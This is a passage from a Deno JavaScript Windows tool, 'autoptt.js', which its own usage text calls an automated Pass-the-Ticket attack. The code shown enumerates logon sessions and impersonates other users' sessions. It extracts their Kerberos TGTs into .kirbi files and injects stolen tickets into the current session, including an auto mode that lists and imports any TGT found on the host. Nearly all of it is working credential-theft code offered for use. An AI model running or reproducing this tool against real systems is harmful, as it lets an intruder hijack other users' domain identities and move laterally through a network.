        console.log('Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3');
        return;
    }
    if (isNaN(targetLogonId)) {
        console.log('Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3');
        return;
    }

    enableDebugPrivilege();

    const countBuf = new Uint8Array(4), listBuf = new Uint8Array(8);
    let status = S.LsaEnumerateLogonSessions(countBuf, listBuf);
    if (status !== 0) { console.log('[-] Failed to enumerate logon sessions'); return; }
    const sessionCount = getU32(countBuf, 0);
    const sessionListPtr = readPtr(listBuf);

    let targetLuid = null, username = '', domain = '';

    for (let i = 0; i < sessionCount; i++) {
        const luidPtr = ptrAdd(sessionListPtr, i * SZ_LUID);
        const lv = new Deno.UnsafePointerView(luidPtr);
        const low = lv.getUint32(0);
        if (low === targetLogonId) {
            targetLuid = { low, high: lv.getInt32(4) };
            const sdBuf = new Uint8Array(8);
            if (S.LsaGetLogonSessionData(luidPtr, sdBuf) === 0) {
                const sdPtr = readPtr(sdBuf);
                if (sdPtr) {
                    username = readLsaUS(sdPtr, SLSD_UserName);
                    domain = readLsaUS(sdPtr, SLSD_LogonDomain);
                    S.LsaFreeReturnBuffer(sdPtr);
                }
            }
            break;
        }
    }
    S.LsaFreeReturnBuffer(sessionListPtr);

    if (!targetLuid) {
        console.log(`Error: LogonId 0x${targetLogonId.toString(16)} not found`);
        return;
    }

    const lsaHandle = getLsaHandleWithImpersonation();
    if (!lsaHandle) { console.log('[-] Failed to get LSA handle'); return; }

    const hImpToken = impersonateSession(targetLogonId);
    let needRevert = false;
    if (hImpToken) {
        if (A.ImpersonateLoggedOnUser(hImpToken)) { needRevert = true; }
        else { K.CloseHandle(hImpToken); }
    }

    const authPack = lookupKerberosPackage(lsaHandle);
    if (authPack === null) {
        console.log('[-] Failed to find Kerberos package');
        S.LsaDeregisterLogonProcess(lsaHandle);
        if (needRevert) { A.RevertToSelf(); K.CloseHandle(hImpToken); }
        return;
    }

    const tgtInfo = findTgtInCache(lsaHandle, authPack);
    if (!tgtInfo) {
        console.log(`Error: No TGT found for LogonId 0x${targetLogonId.toString(16)}`);
        S.LsaDeregisterLogonProcess(lsaHandle);
        if (needRevert) { A.RevertToSelf(); K.CloseHandle(hImpToken); }
        return;
    }

    const svc = requestServiceTicket(lsaHandle, authPack, { low: 0, high: 0 }, tgtInfo.serverName, tgtInfo.flags);
    if (needRevert) { A.RevertToSelf(); K.CloseHandle(hImpToken); }

    if (!svc.ticketBytes) {
        console.log('Error: Failed to retrieve ticket');
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    let cleanUsername = username || 'unknown';
    for (const ch of ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '@', ' ', '$']) {
        cleanUsername = cleanUsername.split(ch).join('_');
    }
    const filename = `0x${targetLogonId.toString(16)}_${cleanUsername}.kirbi`;
    Deno.writeFileSync(filename, svc.ticketBytes);

    console.log('\n[+] TGT ticket exported successfully');
    console.log(`    LogonId: 0x${targetLogonId.toString(16)}`);
    console.log(`    User: ${domain}\\${username}`);
    console.log(`    Server: ${tgtInfo.serverName}`);
    console.log(`    File: ${filename}`);
    console.log(`    Size: ${svc.ticketBytes.length} bytes`);

    S.LsaDeregisterLogonProcess(lsaHandle);
}

function submitTicket(lsaHandle, authPack, ticketData) {
    const submitSize = SZ_SUBMIT_REQ + ticketData.length;
    const sub = new Uint8Array(submitSize);
    putU32(sub, 0, KerbSubmitTicketMessage);
    putU32(sub, 28, ticketData.length);
    putU32(sub, 32, SZ_SUBMIT_REQ);
    sub.set(ticketData, SZ_SUBMIT_REQ);

    const rpBuf = new Uint8Array(8), rsBuf = new Uint8Array(4), psBuf = new Uint8Array(4);
    const status = S.LsaCallAuthenticationPackage(lsaHandle, authPack, sub, submitSize, rpBuf, rsBuf, psBuf);
    const ps = getI32(psBuf, 0);

    if (status !== 0 || ps !== 0) {
        console.log('\nError: Failed to import ticket');
        console.log(`  Status: 0x${hex8(status)}`);
        console.log(`  SubStatus: 0x${hex8(ps)}`);
        if (ps === 0xC000018B || ps === -1073741429) console.log('  Reason: Invalid or malformed ticket');
        else if (ps === 0xC0000225 || ps === -1073741275) console.log('  Reason: Domain not found');
        else if (ps === 0xC000005E || ps === -1073741730) console.log('  Reason: No valid logon sessions');
        else if (ps === 0xC000000D || ps === -1073741811) console.log('  Reason: Invalid parameter');
        const rp = readPtr(rpBuf);
        if (rp) S.LsaFreeReturnBuffer(rp);
        return false;
    }
    const rp = readPtr(rpBuf);
    if (rp) S.LsaFreeReturnBuffer(rp);
    return true;
}

function passTheTicket(filename) {
    if (!fileExists(filename)) { console.log(`Error: Cannot open file ${filename}`); return; }

    const ticketData = Deno.readFileSync(filename);
    const fileSize = ticketData.length;
    if (fileSize <= 0 || fileSize > 10 * 1024 * 1024) { console.log('[-] Invalid file size'); return; }

    const hBuf = new Uint8Array(8);
    let status = S.LsaConnectUntrusted(hBuf);
    if (status !== 0) { console.log(`[-] LsaConnectUntrusted failed: 0x${hex8(status)}`); return; }
    const lsaHandle = readPtr(hBuf);

    const authPack = lookupKerberosPackage(lsaHandle);
    if (authPack === null) { console.log('[-] LsaLookupAuthenticationPackage failed'); S.LsaDeregisterLogonProcess(lsaHandle); return; }

    if (submitTicket(lsaHandle, authPack, ticketData)) {
        console.log('\n[+] Ticket imported successfully into memory');
        console.log(`    File: ${filename}`);
        console.log(`    Size: ${fileSize} bytes`);
        console.log('\n[+] Ticket is now available in Kerberos cache');
        console.log('    You can verify with: autoptt.js klist');
    }

    S.LsaDeregisterLogonProcess(lsaHandle);
}

function autoExportAndImport() {
    g_tgt_list = [];
    console.log('[*] Auto mode: Enumerating tickets and importing selected TGT...');
    printCurrentLogonId();
    enableDebugPrivilege();

    const lsaHandle = getLsaHandleWithImpersonation();
    if (!lsaHandle) { console.log('[-] Failed to get LSA handle'); return; }

    const authPack = lookupKerberosPackage(lsaHandle);
    if (authPack === null) { console.log('[-] Failed to lookup Kerberos package'); S.LsaDeregisterLogonProcess(lsaHandle); return; }

    const countBuf = new Uint8Array(4), listBuf = new Uint8Array(8);
    let status = S.LsaEnumerateLogonSessions(countBuf, listBuf);
    if (status !== 0) { console.log(`[-] Failed to enumerate sessions: 0x${hex8(status)}`); S.LsaDeregisterLogonProcess(lsaHandle); return; }
    const sessionCount = getU32(countBuf, 0);
    const sessionListPtr = readPtr(listBuf);

    for (let i = 0; i < sessionCount; i++) {
        const luidPtr = ptrAdd(sessionListPtr, i * SZ_LUID);
        const lv = new Deno.UnsafePointerView(luidPtr);
        const luidLow = lv.getUint32(0);
        const luidHigh = lv.getInt32(4);

        const sdBuf = new Uint8Array(8);
        status = S.LsaGetLogonSessionData(luidPtr, sdBuf);
        if (status !== 0) continue;
        const sdPtr = readPtr(sdBuf);
        if (!sdPtr) continue;

        const username = readLsaUS(sdPtr, SLSD_UserName);
        const domain = readLsaUS(sdPtr, SLSD_LogonDomain);
        if (!username) { S.LsaFreeReturnBuffer(sdPtr); continue; }

        const cacheReq = buildCacheReq(KerbQueryTicketCacheExMessage, luidLow, luidHigh);
        const rpBuf = new Uint8Array(8), rsBuf = new Uint8Array(4), psBuf = new Uint8Array(4);
        status = S.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheReq, SZ_CACHE_REQ, rpBuf, rsBuf, psBuf);

        if (status !== 0 || getI32(psBuf, 0) !== 0 || !readPtr(rpBuf)) {
            S.LsaFreeReturnBuffer(sdPtr);
            continue;
        }

        const cacheRespPtr = readPtr(rpBuf);
        const crv = new Deno.UnsafePointerView(cacheRespPtr);
        const ticketCount = crv.getUint32(4);

        if (ticketCount === 0) {
            S.LsaFreeReturnBuffer(cacheRespPtr);
            S.LsaFreeReturnBuffer(sdPtr);
            continue;
        }

        for (let j = 0; j < ticketCount; j++) {
            const off = SZ_CACHE_RESP + j * SZ_TCI_EX;
            const serverName = readLsaUS(cacheRespPtr, off + TCIE_ServerName);
            if (serverName.toLowerCase().includes('krbtgt')) {
                addTgtToList(luidLow, username, domain, serverName);
            }
        }

        S.LsaFreeReturnBuffer(cacheRespPtr);
        S.LsaFreeReturnBuffer(sdPtr);
    }
    S.LsaFreeReturnBuffer(sessionListPtr);

    if (g_tgt_list.length === 0) {
        console.log('\nNo TGTs found on the system.');
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    console.log('\n' + '='.repeat(80));
    console.log('  AVAILABLE TGTs');
    console.log('='.repeat(80));
    console.log(`${padRight('Index', 6)} ${padRight('LogonId', 12)} ${padRight('User', 30)} ${padRight('Domain', 20)} Service`);
    console.log(`${'-'.repeat(6)} ${'-'.repeat(12)} ${'-'.repeat(30)} ${'-'.repeat(20)} ${'-'.repeat(32)}`);

    for (let idx = 0; idx < g_tgt_list.length; idx++) {
        const tgt = g_tgt_list[idx];
        console.log(`${padRight(String(idx + 1), 6)} ${padRight('0x' + tgt.logon_id.toString(16), 12)} ${padRight(tgt.username, 30)} ${padRight(tgt.domain, 20)} ${tgt.service_name}`);
    }

    const answer = prompt(`\nChoose TGT to export and import (1-${g_tgt_list.length}), or 0 to cancel:`);
    const choice = parseInt(answer, 10);

    if (isNaN(choice) || choice <= 0 || choice > g_tgt_list.length) {
        console.log('Cancelled or invalid choice.');
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    const selectedTgt = g_tgt_list[choice - 1];
    const targetLogonId = selectedTgt.logon_id;
    console.log(`\n[*] Selected: #${choice} - 0x${targetLogonId.toString(16)} (${selectedTgt.username})`);

    const hImpToken = impersonateSession(targetLogonId);
    let needRevert = false;
    if (hImpToken) {
        if (A.ImpersonateLoggedOnUser(hImpToken)) { needRevert = true; }
        else { K.CloseHandle(hImpToken); }
    }

    const tgtInfo = findTgtInCache(lsaHandle, authPack);
    if (!tgtInfo) {
        console.log('[-] TGT not found in cache');
        if (needRevert) { A.RevertToSelf(); K.CloseHandle(hImpToken); }
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    const svc = requestServiceTicket(lsaHandle, authPack, { low: 0, high: 0 }, tgtInfo.serverName, tgtInfo.flags);
    if (needRevert) { A.RevertToSelf(); K.CloseHandle(hImpToken); }

    if (!svc.ticketBytes || svc.ticketBytes.length === 0) {
        console.log('[-] Failed to retrieve ticket');
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    console.log('[+] Ticket retrieved successfully');
    console.log(`    Size: ${svc.ticketBytes.length} bytes`);
    console.log('\n[*] Importing ticket into current session...');

    if (submitTicket(lsaHandle, authPack, svc.ticketBytes)) {
        console.log('\n[+] TGT imported successfully into current session');
        console.log(`    LogonId: 0x${targetLogonId.toString(16)}`);
        console.log(`    User: ${selectedTgt.username}`);
        console.log(`    Service: ${tgtInfo.serverName}`);
        console.log('\n[+] Ticket is now available in your Kerberos cache');
        console.log('    You can verify with: autoptt.js klist');
    }

    S.LsaDeregisterLogonProcess(lsaHandle);
}

// ── Banner & main ────────────────────────────────────────────────────────────

function printBanner() {
    console.log(`
     ___         __       ___  ____________
    / _ | __ __ / /_ ___ / _ \\/_  __/_  __/
   / __ |/ // // __// _ \\/ ___/ / /   / /
  /_/ |_|\\_,_/ \\__/ \\___/_/    /_/   /_/

  v1.1 - Kerberos Ticket Enumerator (Deno)
  sessions, klist, tickets, export, ptt, auto
`);
}

function main() {
    const args = Deno.args;
    const scriptName = 'autoptt.js';

    if (args.length > 0) {
        const command = args[0].toLowerCase();
        if (command === 'sessions') {
            printCurrentLogonId();
            enumerateLogonSessions();
        } else if (command === 'klist') {
            printCurrentLogonId();
            enumerateMyTickets();
        } else if (command === 'tickets') {
            printCurrentLogonId();
            enumerateAllTickets(true);
        } else if (command === 'export' && args.length > 1) {
            exportTicket(args[1]);
        } else if (command === 'ptt' && args.length > 1) {
            passTheTicket(args[1]);
        } else if (command === 'auto') {
            autoExportAndImport();
        } else {
            printBanner();
            console.log('Usage:');
            console.log(`  ${scriptName} auto             - Automated Pass-the-Ticket attack`);
            console.log(`  ${scriptName} sessions         - List all logon sessions`);
            console.log(`  ${scriptName} klist            - List tickets in current session`);
            console.log(`  ${scriptName} tickets          - List all tickets from all sessions`);
            console.log(`  ${scriptName} export <LogonId> - Export a TGT given the LogonId`);
            console.log(`  ${scriptName} ptt <file>       - Import a ticket file given the file name`);
            console.log();
        }
    } else {
        printBanner();
        console.log('Usage:');
        console.log(`  ${scriptName} auto             - Automated Pass-the-Ticket attack`);
        console.log(`  ${scriptName} sessions         - List all logon sessions`);
        console.log(`  ${scriptName} klist            - List tickets in current session`);
        console.log(`  ${scriptName} tickets          - List all tickets from all sessions`);
        console.log(`  ${scriptName} export <LogonId> - Export a TGT given the LogonId`);
        console.log(`  ${scriptName} ptt <file>       - Import a ticket file given the file name`);
        console.log();
    }
}

main();
